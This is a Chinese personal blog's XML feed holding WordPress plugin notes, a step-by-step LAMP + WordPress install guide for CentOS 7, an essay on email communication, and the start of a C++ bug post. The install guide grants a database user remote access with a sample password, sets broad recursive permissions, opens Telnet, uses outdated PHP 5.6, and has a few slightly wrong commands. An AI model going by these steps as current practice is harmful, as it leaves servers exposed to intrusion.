（Redis动态对象缓存）</font></h2><p>此插件的作用是生成<strong>动态对象缓存</strong>，可<strong>加速站点访问</strong>。</p><p>相比静态缓存的部署要复杂，主要适用于那些经常需要动用数据库查询的站点（例如WordPress论坛）。具体部署方法可参看<a href="%E5%8A%A0%E9%80%9F%E8%AE%BF%E9%97%AEWordPress.html">《加速访问WordPress：Redis部署笔记》</a>。</p><h2 id="Baidu-Sitemap-Generator-（百度站点地图生成器）"><a href="#Baidu-Sitemap-Generator-（百度站点地图生成器）" class="headerlink" title="Baidu Sitemap Generator （百度站点地图生成器）"></a><font color="red">Baidu Sitemap Generator （百度站点地图生成器）</font></h2><p>每个站点都必备一个站点地图Sitemap，有站点地图会更容易被搜索引擎收录站点内容（当然robots.txt协议文件也很重要）。</p><p>可以生成站点地图的插件很多，但是如果是中文站点，推荐还是使用百度，毕竟百度是全球最大的中文搜索引擎，使用此插件更易于被百度蜘蛛收录。</p><p><strong>特色</strong>：</p><ul><li>① 支持生成xml格式站点地图</li><li>② 支持生成html格式站点地图</li><li>③ 随着站点更新，可以同步生成站点地图</li></ul><p><img src="./26.png"></p><p><img src="./27.png"></p><h2 id="Baidu-Links-Submit-（百度链接提交插件）"><a href="#Baidu-Links-Submit-（百度链接提交插件）" class="headerlink" title="Baidu Links Submit （百度链接提交插件）"></a><font color="red">Baidu Links Submit （百度链接提交插件）</font></h2><p>相对站点地图Sitemap的<strong>被动</strong>收录而言，此插件可以<strong>主动</strong>向百度实时提交网站的新链接，使其被百度搜索引擎及时收录，需注册 <a href="https://ziyuan.baidu.com/badlink/index?site=">百度站长平台</a> 配合使用。</p><p>插件最初来源于 <a href="http://bbs.zhanzhang.baidu.com/thread-28753-1-1.html">百度站长论坛</a>，但是因为原版主在2015年已停更，后来百度站长平台又升级了、加之插件本身也有几个BUG，最后导致无法使用了。</p><p>鉴于我比较喜欢这个插件的风格，因此我把2015版本的BUG修正后，重新发布了这个2018修正版：</p><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10519791">Baidu Links Submit  v2.0（20180704）下载</a></p></blockquote><p>该插件的原理其实就是封装了 “<strong>百度站长平台-&gt;链接提交-&gt;自动提交-&gt;主动推送（实时）</strong>” 的功能。<font color="red">因此使用了此插件后，原本用于主动实时提交到百度的其他类似功能的插件或JS代码就要删掉了，避免二次提交导致百度翻脸</font>。</p><p><strong>使用方法</strong>请参看<a href="../wp-cha-jian-baidulinkssubmit/">《WP插件：Baidu Links Submit - 实时推送站点链接到百度》</a></p><p><img src="./28.png"></p><h2 id="WP-Content-Copy-Protection-amp-No-Right-Click-（文章保护插件）"><a href="#WP-Content-Copy-Protection-amp-No-Right-Click-（文章保护插件）" class="headerlink" title="WP Content Copy Protection &amp; No Right Click （文章保护插件）"></a><font color="red">WP Content Copy Protection &amp; No Right Click （文章保护插件）</font></h2><p>如果你的站点不希望被别人随意复制内容，那么这个插件就很有用了。不过这个插件会对读者很不友好，需要慎用。</p><p><strong>特色</strong>：</p><ul><li>① JavaScript保护</li><li>② CSS保护</li><li>③ 主页保护</li><li>④ 静态页面保护</li><li>⑤ 禁止右键功能（避免右键复制）</li><li>⑥ 禁止内容选择（避免快捷键复制）</li><li>⑦ 自定义禁止提示语</li></ul><p><img src="./29.png"></p><h2 id="Auto-Add-Copyright-（自动追加站点版权插件）"><a href="#Auto-Add-Copyright-（自动追加站点版权插件）" class="headerlink" title="Auto Add Copyright （自动追加站点版权插件）"></a><font color="red">Auto Add Copyright （自动追加站点版权插件）</font></h2><p>这是本站出品的一个插件，相比于前一个插件（WP Content Copy Protection &amp; No Right Click），这个插件的做法则温和得多，对读者也更友好。</p><p><strong>特色</strong>：</p><ul><li>① 当读者试图复制站点内容时，会自动在复制内容末尾追加站点版权信息</li><li>② 可设置允许读者复制的内容长度，小于这个长度不会触发追加机制</li><li>③ 可设置本插件的生效范围：全站、或仅文章页面</li><li>④ 支持大部分主流浏览器</li><li>⑤ 复制内容支持纯文本、代码等，不会造成复制内容格式变形</li></ul><p>此插件的详细介绍可见<a href="../wp-cha-jian-autoaddcopyright/">《WP插件：Auto Add Copyright – 被复制时自动追加版权链接》</a>。</p><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10527059">Auto Add Copyright   v1.0（20180707）下载</a></p></blockquote><p><img src="./30.png"></p><h2 id="Insert-Post-Ads-（文章内页广告插件）"><a href="#Insert-Post-Ads-（文章内页广告插件）" class="headerlink" title="Insert Post Ads （文章内页广告插件）"></a><font color="red">Insert Post Ads （文章内页广告插件）</font></h2><p>可以自由定制在文章首部、尾部、中间某个段落后插入一个或多个广告，解决了在编写文章时去才能在文章中间插入广告的问题。</p><p><img src="./31.png"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> 插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LAMP + WordPress 部署笔记</title>
      <link href="/articles/website/wordpress-bu-shu-bi-ji/"/>
      <url>/articles/website/wordpress-bu-shu-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>现在网上虽然有大量WAMP、LAMP、LNMP环境部署的文章，但是不少都过期了或者没有完整的体系、或者没有说明环境版本、再不然就是太罗嗦找不到部署重点。因为环境和版本的各种问题，我在云服务器上面部署的时候碰了不少壁。</p><p>这篇笔记是我在全新安装的、干净的Centos7.4系统的基础下，重复部署了5次<font color="red">LAMP</font>环境之后总结出来的，尽量只罗列出安装环境所用到的每个命令步骤以及说明，不含多余的东西，<font color="red">安装目录也基本使用了默认目录，没有去改动，便于大家复制部署</font>。</p><p>至于WAMP与LNMP不在本文讨论范围内，主要因为WAMP比较简单。而就个人而已，相比于Nginx更习惯Apache，所以最终选了LAMP。</p><h2 id="2-安装软件说明"><a href="#2-安装软件说明" class="headerlink" title="2. 安装软件说明"></a>2. 安装软件说明</h2><table><thead><tr><th align="center">英文缩写</th><th align="center">释义</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">适用平台</td><td align="center">本地物理机/本地虚拟机/云服务器</td><td align="center">本文使用的是 <a href="https://cloud.tencent.com/product/cvm">腾讯云CVM服务器</a></td></tr><tr><td align="center"><del>WAMP</del></td><td align="center"><del>Windows + Apache + Mysql + PHP</del></td><td align="center"><del>Web应用软件集成环境（Window系统）</del></td></tr><tr><td align="center"><del>LNMP</del></td><td align="center"><del>Linux + Nginx + Mysql + PHP</del></td><td align="center"><del>Web应用软件集成环境（Linux系统）</del></td></tr><tr><td align="center">LAMP</td><td align="center">Linux + Apache + Mysql + PHP</td><td align="center">Web应用软件集成环境（Linux系统）</td></tr><tr><td align="center">L</td><td align="center">Linux系统</td><td align="center">本文使用的版本号是Centos 7.4.1708</td></tr><tr><td align="center">A</td><td align="center">Apache</td><td align="center">本文使用的版本号是2.4.6</td></tr><tr><td align="center">M</td><td align="center">MariaDB / Mysql</td><td align="center">本文使用的是MariaDB 5.5.56</td></tr><tr><td align="center">P</td><td align="center">PHP</td><td align="center">本文使用的版本号是5.6.36</td></tr></tbody></table><h3 id="2-1-关于MariaDB数据库"><a href="#2-1-关于MariaDB数据库" class="headerlink" title="2.1. 关于MariaDB数据库"></a>2.1. 关于MariaDB数据库</h3><p>MariaDB是Mysql的分支版本，完全兼容Mysql。</p><p>本文的操作系统是基于Centos 的，Centos 默认使用的就是MarriDB。之所以不使用Mysql，是因为Mysql被Oracle收购后存在闭源风险，因此建议使用MariaDB。</p><h3 id="2-2-关于PHP版本"><a href="#2-2-关于PHP版本" class="headerlink" title="2.2. 关于PHP版本"></a>2.2. 关于PHP版本</h3><p>另外，出于系统安全起见，这里特别提及一下PHP的版本号问题：</p><p>2018年01月22日公布了一个 <strong>CVE-2018-5711: PHP GD库拒绝服务漏洞</strong>：</p><p><a href="https://help.aliyun.com/noticelist/articleid/20788282.html">https://help.aliyun.com/noticelist/articleid/20788282.html</a></p><p>大概意思就是若PHP开启了GD库模块，那么就有可能被一张恶意GIF搞到CPU满荷死机（现在WordPress普遍都会使用timthumb.php对缩略图进行缓存优化以加速网站访问，这个功能会用到GD库）。</p><p><strong>受这个BUG影响的PHP版本</strong>：</p><ul><li>PHP 5 &lt; 5.6.33版本</li><li>PHP 7.0 &lt; 7.0.27版本</li><li>PHP 7.1 &lt; 7.1.13版本</li><li>PHP 7.2 &lt; 7.2.1版本</li></ul><p>这篇文章我使用的是5.6.36版本。之所以没有选择最新的PHP 7.x版本，是因为LAMP环境下，PHP还要安装与之配套版本的phpMyAdmin让PHP访问数据库。而我没有刻意去找与 7.x配套的phpMyAdmin，所以用了5.6.36。其实5.x还是没什么所谓，只要注意不要安装有问题的版本就好。</p><p>顺便一提，<strong>windows环境</strong>还要区分<strong>线程安全版本</strong>和<strong>非线程安全版本</strong>，至于为什么自行百度。但本文说的是<strong>Linux环境，就无需考虑了</strong>。</p><h2 id="3-LAMP环境安装"><a href="#3-LAMP环境安装" class="headerlink" title="3. LAMP环境安装"></a>3. LAMP环境安装</h2><h3 id="3-1-安装操作系统：Linux-CentOS-Linux-release-7-4-1708-Core"><a href="#3-1-安装操作系统：Linux-CentOS-Linux-release-7-4-1708-Core" class="headerlink" title="3.1. 安装操作系统：Linux - CentOS Linux release 7.4.1708 (Core)"></a>3.1. 安装操作系统：Linux - CentOS Linux release 7.4.1708 (Core)</h3><p>操作系统安装过程略，因为无论是在本地物理机、虚拟机，还是在云服务器，都是可以傻瓜式安装，此处就不多言了。</p><p>查看系统版本号:</p><blockquote><p>cat /etc/redhat-release</p></blockquote><p>更新操作系统（可选，建议）：</p><blockquote><p>yum clean all<br>yum -y update</p></blockquote><h3 id="3-2-安装Apache-2-4-6-CentOS"><a href="#3-2-安装Apache-2-4-6-CentOS" class="headerlink" title="3.2. 安装Apache/2.4.6 (CentOS)"></a>3.2. 安装Apache/2.4.6 (CentOS)</h3><p>安装默认Apache：</p><blockquote><p>yum -y install httpd</p></blockquote><p>查看Apache版本号：</p><blockquote><p>apachectl -v</p></blockquote><p>启动Apache：</p><blockquote><p>systemctl start httpd</p></blockquote><p>使得Apache开机启动：</p><blockquote><p>systemctl enable httpd</p></blockquote><p>测试Apache是否安装成功，浏览器打开网址：</p><blockquote><p><a href="http://127.0.0.1/">http://127.0.0.1</a></p></blockquote><p>注意，若打不开，检查下：</p><ul><li>① 防火墙要开放80端口入网规则</li><li>② 若是云服务器IP要改成公网地址</li><li>③ 若是云服务器要配置安全组策略开放80端口</li></ul><p>为WordPress开启mod_rewrite模块功能（用于支持“固定链接”和“站点网络”功能），使用vi打开Apache配置文件：</p><blockquote><p>vi /etc/httpd/conf/httpd.conf</p></blockquote><p>定位到&lt;directory&gt;段修改下列语句，其他部分不用修改。</p><blockquote><p>AllowOverride <strong>None</strong>   修改为  AllowOverride <strong>All</strong></p></blockquote><p>定位到&lt;directory “/var/www”&gt;段修改下列语句，其他部分不用修改。</p><blockquote><p>AllowOverride <strong>None</strong>   修改为  AllowOverride <strong>All</strong></p></blockquote><p>定位到&lt;directory “/var/www/html”&gt;段修改下列语句，其他部分不用修改。</p><blockquote><p>AllowOverride <strong>None</strong>   修改为  AllowOverride <strong>All</strong></p></blockquote><p><strong>至此Apache安装完成</strong>。</p><p><strong>注意</strong>（这些先记下来，不用动，后面有用）：</p><ul><li>① 此时Centos会多了一个<font color="red">用户apache，用户组为apache</font>。</li><li>② Apache的<font color="red">html项目默认路径</font>为：</li></ul><blockquote><p>/var/www/html</p></blockquote><h3 id="3-3-安装MariaDB-5-5-56"><a href="#3-3-安装MariaDB-5-5-56" class="headerlink" title="3.3. 安装MariaDB-5.5.56"></a>3.3. 安装MariaDB-5.5.56</h3><p>安装默认MariaDB：</p><blockquote><p>yum install mariadb-server mariadb</p></blockquote><p>启动MariaDB：</p><blockquote><p>systemctl start mariadb</p></blockquote><p>因首次安装，配置MariaDB：</p><blockquote><p>mysql_secure_installation</p></blockquote><p>此时会问你几个问题：</p><blockquote><p><strong>Enter current password for root (enter for none):</strong><br>　　要求输入root用户当前密码，<strong>由于没有，直接回车不要输入任何东西</strong>，不然不能往下<br><strong>Set root password? [Y/n]</strong><br>　　是否设置root用户密码，<strong>选Y</strong>， 然后自己设置密码就是<br><strong>Remove anonymous users? [Y/n]</strong><br>　　是否移除anonymous 用户，<strong>选Y</strong>，这个用户仅用于测试，在服务器上可能有提权隐患<br><strong>Disallow root login remotely? [Y/n]</strong><br>　　是否禁止root用户远程登录，<strong>选Y</strong>， 为了安全起见，等下再建一个用户用于远程访问就是。<br>　　一般情况下服务器也不应该开放3306端口（除非要迁移数据），容易被攻击。<br><strong>Remove test database and access to it? [Y/n]</strong><br>　　是否移除测试数据库，<strong>选Y</strong>， 没什么用<br><strong>Reload privilege tables now? [Y/n]</strong><br>　　是否重载权限表使所有设置生效，<strong>选Y</strong></p></blockquote><p>使得MariaDB开机启动：</p><blockquote><p>systemctl enable mariadb</p></blockquote><p>连接MariaDB数据库，输入刚才设置的密码：</p><blockquote><p>mysql -u root -p</p></blockquote><p>创建wordpress数据库（后面部署WordPress要用到，记住<font color="red">数据库名wordpress</font>）：</p><blockquote><p>create database <font color="red">wordpress</font>;</p></blockquote><p>建议创建一个WordPress专用的<font color="red">数据库用户wpUser</font> ，而不要用root用户：</p><blockquote><p>create user <font color="red">wpUser</font> identified by '<font color="red">wpPasswd</font>';</p></blockquote><p>授予其wordpress数据库所有权限并可用于远程登陆（但<strong>平时不要开放远程登陆端口</strong>，可通过防火墙或云服务的安全组策略对3306端口进行拦截）：</p><blockquote><p>grant all privileges on <font color="red">wordpress.</font> to '<font color="red">wpUser</font>'@'<font color="red">%</font>' identified by '<font color="red">wpPasswd</font>' with grant option;</p></blockquote><p>刷新权限表使前面设置生效：</p><blockquote><p>flush privileges;</p></blockquote><p>断开数据库连接：</p><blockquote><p>exit;</p></blockquote><p><strong>至此MariaDB安装完成</strong>。</p><h3 id="3-4-安装PHP-5-6-36"><a href="#3-4-安装PHP-5-6-36" class="headerlink" title="3.4. 安装PHP 5.6.36"></a>3.4. 安装PHP 5.6.36</h3><p>由于PHP官网的源可能比较旧（默认是5.4），这里换一个安装源：</p><blockquote><p>rpm -Uvh <a href="https://mirror.webtatic.com/yum/el7/webtatic-release.rpm">https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</a></p></blockquote><p>若报错：<em>epel-release &gt;= 7 is needed by webtatic-release-7-3.noarch</em> , 先安装这个工具（<strong>安装完后重新跑前一个命令</strong>）：</p><blockquote><p>yum -y install epel-release</p></blockquote><p>然后看一下有没有我们要装的PHP版本（所列印表单的第二列就是版本号，若看到PHP 5.6相关组件都是大于5.6.33 版本的，则可以安装）：</p><blockquote><p>yum list php*</p></blockquote><p>安装PHP 5.6的组件（这些模块就是从列表中选的，注意不用加后缀）：</p><blockquote><p>yum install php56w php56w-mysql php56w-gd libjpeg* php56w-ldap php56w-odbc php56w-pear php56w-xml php56w-xmlrpc php56w-mbstring php56w-bcmath </p></blockquote><p>PHP 5.6还要额外安装一个加密组件：</p><blockquote><p>yum groupinstall “development tools”<br>yum -y install mhash mhash-devel mcrypt</p></blockquote><p>另外PHP的配置文件在这里（暂时<strong>不需要动</strong>）：</p><blockquote><p>/etc/php.ini</p></blockquote><p>查看PHP版本号：</p><blockquote><p>php -v</p></blockquote><p><strong>至此PHP安装完成</strong>。</p><h3 id="3-5-安装phpMyAdmin"><a href="#3-5-安装phpMyAdmin" class="headerlink" title="3.5. 安装phpMyAdmin"></a>3.5. 安装phpMyAdmin</h3><p>这个工具是通过web界面管理数据库的（Web版本的数据库客户端工具），依赖于PHP，所以版本要与PHP配套。Centos7自带的phpmyadmin可用于PHP5.x，直接安装就可以了：</p><blockquote><p>yum -y install phpmyadmin</p></blockquote><p>安装完后重启下Apache服务：</p><blockquote><p>systemctl restart httpd.service</p></blockquote><p>测试phpMyAdmin是否安装成功，浏览器打开网址：</p><blockquote><p><a href="http://127.0.0.1/phpMyAdmin/index.php">http://127.0.0.1/phpMyAdmin/index.php</a></p></blockquote><p>注意，若打不开，检查下：</p><ul><li>① 防火墙要开放80、3306端口入网规则</li><li>② 若是云服务器IP要改成公网地址</li><li>③ 若是云服务器要配置安全组策略开放80、3306端口</li><li>④ 若部署在云服务器，不建议放权打开这个地址</li></ul><p>使用vi命令修改phpMyAdmin的配置文件用于连接数据库：</p><blockquote><p>vi /etc/phpMyAdmin config.inc.php</p></blockquote><p>由于使用MariaDB / Mysql数据库，很多选项保持默认值即可，只要把刚才设置的数据库帐密设置进去即可：</p><blockquote><p>$cfg['Servers'][$i]['user'] = '<font color="red">wpUser</font>';<br>cfg['Servers'][$i]['password'] = '<font color="red">wpPasswd</font>';</p></blockquote><p>最后重启下Apache服务：</p><blockquote><p>systemctl restart httpd.service</p></blockquote><p><strong>至此phpMyAdmin安装完成，LAMP环境安装完成</strong>。</p><h3 id="3-6-安装WordPress-4-9-4中文版"><a href="#3-6-安装WordPress-4-9-4中文版" class="headerlink" title="3.6. 安装WordPress 4.9.4中文版"></a>3.6. 安装WordPress 4.9.4中文版</h3><p>由于Centos7的官方源都是英文版，可以去WordPress的官网下载中文版：</p><blockquote><p><a href="https://cn.wordpress.org/txt-download/">https://cn.wordpress.org/txt-download/</a></p></blockquote><p>下载回来后，上传并解压到Apache的html项目目录下：</p><blockquote><p>/var/www/html</p></blockquote><p>上传可使用FTP（后面再说安装步骤），也可使用rz工具（<strong>推荐，更方便</strong>），rz安装命令如下：</p><blockquote><p>yum install lrzsz</p></blockquote><p>上传wordpress压缩包：</p><blockquote><p>rz</p></blockquote><p><strong>上传后，这里有两种处理方式</strong>：</p><ul><li>① 直接解压 wordpress根目录到/var/www/html目录下，以后用于访问wordpress站点的URL为：<a href="http://127.0.0.1/wordpress">http://127.0.0.1/wordpress</a></li><li>② 不要wordpress根目录，只把里面的内容解压到/var/www/html目录下，以后用于访问wordpress站点的URL为：<a href="http://127.0.0.1/">http://127.0.0.1</a></li></ul><p>本文选择的是第 ② 种，因为我只需要部署wordpress一个web项目，而且注册了域名。如果所有URL地址都加了wordpress目录，别人访问麻烦而且丑。</p><p>解压wordpress，并删除wordpress根目录：</p><pre class="line-numbers language-bash"><code class="language-bash">unzip wordpress.zip<span class="token function">mv</span> -r ./wordpress/* <span class="token keyword">.</span><span class="token function">rm</span> -rf wordpress/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如下图所示，此时我的wordpress部署位置是这样的（<strong>直接在/var/www/html目录下，且没有wordpress目录</strong>）：</p><p><img src="./01.png" alt="WordPress安装位置"></p><p>通过确认Apache配置文件/etc/httpd/conf/httpd.conf，可以发现这两个配置项：</p><blockquote><p>user apache<br>group apache</p></blockquote><p>说明WordPress以后会以apache用户在/var/www目录下进行读写操作，因此为了避免因为权限问题导致读写失败，需修改目录权限。</p><p>设置http根目录/var/www的所有组为apache：</p><blockquote><p>chown -R :apache /var/www</p></blockquote><p>设置http根目录/var/www的所有者为apache：</p><blockquote><p>chown -R apache /var/www</p></blockquote><p>设置http根目录/var/www的所有组下所有用户具有读写权限：</p><blockquote><p>chmod -R 775 /var/www</p></blockquote><h3 id="3-7-安装FTP"><a href="#3-7-安装FTP" class="headerlink" title="3.7. 安装FTP"></a>3.7. 安装FTP</h3><p>一般情况下，到这里为止WordPress就不会因为权限问题、因为无法读写/var/www目录，导致无法升级安装主题、插件。</p><p>但如果WordPress还是提示需要FTP进行安装升级，可以继续加一个FTP用户。</p><p>安装FTP服务：</p><blockquote><p>yum install -y vsftpd</p></blockquote><p>启动FTP：</p><blockquote><p>systemctl start vsftpd.service</p></blockquote><p>使得FTP开机启动：</p><blockquote><p>systemctl enable vsftpd.service</p></blockquote><p>为了安全起见，取消FTP匿名登录：</p><blockquote><p>vi /etc/vsftpd/vsftpd.conf<br><em>把第一行的 anonymous_enable=YES ，修改为NO</em></p></blockquote><p>如果这里图方便，可以为root用户开放FTP权限，<strong>编辑这两个文件，用#注释root</strong>即可（<font color="red">但是如果是在云服务器，不建议这么做</font>）：</p><blockquote><p>vi /etc/vsftpd ftpusers<br>vi /etc/vsftpd user_list</p></blockquote><p>添加一个Apache专用的FTP<font color="red">用户apacheftp</font>：</p><blockquote><p>adduser -d /var/www -g apache -s /sbin/nologin <font color="red">apacheftp</font><br><em>命令解析：使用命令(adduser)添加apacheftp用户，不能登录系统(-s /sbin/nologin)，用户文件夹在(-d /var/www)，属于组apache(-g apache)</em></p></blockquote><p>若出现这个提示，不用管：</p><blockquote><p>adduser: warning: the home directory already exists.<br>ot copying any file from skel directory into it.</p></blockquote><p>设置<font color="red">apacheftp</font>用户密码：</p><blockquote><p>passwd <font color="red">apacheftp</font></p></blockquote><p>添加用户<font color="red">apacheftp</font>到ftp用户组， 这样apacheftp就同时属于ftp和apache两个组：</p><blockquote><p>usermod -a -G ftp <font color="red">apacheftp</font></p></blockquote><p>重启FTP服务：</p><blockquote><p>systemctl restart vsftpd.service</p></blockquote><p>最后打开浏览器：<a href="http://127.0.0.1/">http://127.0.0.1</a> ，就可以开始配置Wordpress了。</p><p>初始安装会在页面要求设置数据库的库名、帐密，设置为前文设置的值即可。</p><p>若以后需要更改数据库配置，可在 <strong>/var/www/html/wp-config.php</strong>　中进行修改。</p><p><strong>至此WordPress安装完成</strong>。</p><h3 id="3-8-可选：安装防火墙firewalld"><a href="#3-8-可选：安装防火墙firewalld" class="headerlink" title="3.8. 可选：安装防火墙firewalld"></a>3.8. 可选：安装防火墙firewalld</h3><p>服务器上为了安全起见，建议打开防火墙，Centos默认已安装好firewalld，但处于关闭状态。</p><p>查看防火墙状态：</p><blockquote><p>firewall-cmd --state</p></blockquote><p>开启防火墙：</p><blockquote><p>systemctl start firewalld</p></blockquote><p>永久放开HTTP 80端口、FTP服务（含20/21端口）、远程登录 22端口、Telnet 23端口：</p><blockquote><p>firewall-cmd --add-port=80/tcp --permanent<br>firewall-cmd --add-service=ftp --permanent<br>firewall-cmd --add-port=22/tcp --permanent<br>firewall-cmd --add-port=23/tcp --permanent</p></blockquote><p>重载防火墙规则：</p><blockquote><p>firewall-cmd --reload</p></blockquote><p>查看当前的防火墙规则：</p><blockquote><p>iptables -L -n</p></blockquote><p>设置防火墙为开机启动：</p><blockquote><p>systemctl enable firewalld</p></blockquote><p><font color="red">至此LAMP + WordPress的基本环境全部部署完成</font>。</p><h2 id="4-后话：几个重要的配置文件"><a href="#4-后话：几个重要的配置文件" class="headerlink" title="4. 后话：几个重要的配置文件"></a>4. 后话：几个重要的配置文件</h2><p>① Apache-httpd服务的配置文件，主要用于配置Apache的rewrite模块功能：</p><blockquote><p>/etc/httpd/conf/httpd.conf</p></blockquote><p>② PHP的配置文件（若在win环境用于打开关闭php的扩展模块； 若在linux环境没什么用，要用哪些模块需要直接安装即可）：</p><blockquote><p>/etc/php.ini</p></blockquote><p>③ phpMyAdmin配置文件，其利用PHP在网页连接数据库，若数据库配置变更需要修改此配置文件：</p><blockquote><p>/etc/phpMyAdmin/config.inc.php</p></blockquote><p>④ Wordpress配置文件，若数据库配置变更需要修改此配置文件，另外wordpress的某些自定义配置也需要用到此配置文件：</p><blockquote><p>/var/www/html/wp-config.php</p></blockquote><p>⑤ Mariadb配置文件，后续需要优化数据库时要修改这些配置文件：</p><blockquote><p>/etc/my.cnf　# 此配置文件引用了 /etc/my.cnf.d 目录下的配置，不建议改动，避免Mariadb升级时覆盖掉<br>/etc/my.cnf.d/server.cnf　　# 一般情况下修改这个配置文件即可<br>/etc/my.cnf.d/client.cnf<br>/etc/my.cnf.d/mysql-clients.cnf</p></blockquote><h2 id="5-资源下载"><a href="#5-资源下载" class="headerlink" title="5. 资源下载"></a>5. 资源下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10484861">本文全文下载</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> LAMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你难道没收到我的邮件？</title>
      <link href="/articles/insights/ni-nan-dao-mei-shou-dao-wo-de-you-jian/"/>
      <url>/articles/insights/ni-nan-dao-mei-shou-dao-wo-de-you-jian/</url>
      
        <content type="html"><![CDATA[<p>细数公司十大经典金句之首，当孰【你难道没收到我的邮件？】无疑（了吧~ 我发誓我木有统计过）——尤其是邮件作为我们公司主要的沟通手段之一，我对这句话可谓印象深刻了。</p><p>回想刚到公司的时候，我还不会打座机电话（我承认我真的去学了打电话…），当时跟工程同事唯一的沟通手段就是邮件，有时甚至把邮件当QQ用了。但毕竟邮件不是QQ，时效性略差。有时候一些问题得不到确认，于是事后问对方最多的就是你有没有收到我的邮件了。</p><p>通常情况下，我们大部分人都有一个认知误区：只要把邮件发给对方了，对方就一定会知晓并执行，于是自己的沟通任务就完成了。但事实是，对方很可能没有（及时）收到邮件，即使收到了邮件，也不代表能够理解、接受、甚至执行。</p><p><img src="./01.png"></p><p>沟通并不仅仅是发送邮件那么简单——发送邮件不过是沟通手段的一种，切莫把沟通手段和沟通过程混淆了。</p><p>真正意义上的沟通，是指思想碰撞并传递的过程。只有我和你能够以相同的角度去看待某个问题、理解其细节，才能说我和你完成了沟通。否则即使你清楚明白地看到了（听到了）我的每字每句，但是你不理解我的意思，那我和你也没有做任何有实际意义的沟通。</p><p>邮件上的沟通，按我们通常的说法，充其量只是“存证式的沟通”。确实它可以作为沟通证据，但过于依赖邮件则可能造成沟通障碍——尤其是当邮件包含的信息量越大，其中的细节就越容易被忽略。</p><p>况且信息淹没只是沟通障碍的一种。文化背景、个人偏见等主观因素也会成为沟通障碍的帮凶。为了减少类似不必要的障碍，我现在工作的时候，更倾向于面对面的、或电话式的交流，同时我也会定期写一些文章，借此向身边的人表述我近期的观点或见闻——我觉得消除障碍最好的方法就是让别人可以更直接地了解自己。</p><p>我越来越觉得，当一个问题被过于依赖用邮件去处理时候，处理周期越长，它就像抛绣球似得被抛来抛去。多用面对面或电话式的沟通，则可以促使我们在当下通过讨论去解决、反思问题。而写文章则可以避免直面的尴尬，在特定的时期向其他人表述自己的观点。</p><p>实际上，我一直以来都有写文章的习惯，而且我有自己的Blog。但自从去年开始公司办了内刊，我就把本应发表去Blog的一部分文章改投放到公司内刊了。原因有二：一是可以令身边的人更了解我的想法，增强他人对自己的熟悉感会利于平时沟通；二是我更喜欢公司有个人可以帮我对文章把关，使我的文笔有所提升——我并不介意文章被挑剔，因为我始终相信：“谁越是对你的文笔斤斤计较，谁就越可能是决定你前途的人”。</p><p>但沟通不仅仅相互理解、消除障碍就足够了。沟通也是需要策略的，首要一条就是让对方可以听懂并接受的方式去表述，否则只会徒增对方的失落感、甚至乎反感。其次就是用可以吸引对方注意力的方式去表述——我相信相比起一本新书，遍布重点的参考书更有吸引力，尤其在考试前。</p><p>最后我需要声明的是，写下这篇文章，并不是说邮件沟通有什么不好。恰恰相反，邮件作为“存证式”的沟通手段，是其他沟通方式不能替代的。而之所以用邮件说明问题，不过是作为这篇劣文一个引子，我真正所倡导的，是灵活、有效的沟通过程——这才是我们需要的——我们大可以在完成沟通后，再用邮件来存证一下不是么？</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 沟通 </tag>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找 BUG 记</title>
      <link href="/articles/insights/zhao-bug-ji/"/>
      <url>/articles/insights/zhao-bug-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="令人头痛的陈年老BUG（序章）"><a href="#令人头痛的陈年老BUG（序章）" class="headerlink" title="令人头痛的陈年老BUG（序章）"></a>令人头痛的陈年老BUG（序章）</h2><p>前几天，码农朋友甲（下文简称“甲”）拿着我5年前发表在某博文的代码问我：“这段代码是有bug吧？”下面就是他给我指出来的一段C++代码，大家可以先尝试能不能找到甲看到的bug：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> solve<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">Initial</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    TimeStamp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// 时间戳</span>    DFN <span class="token operator">=</span> new <span class="token keyword">int</span><span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 搜索次序</span>    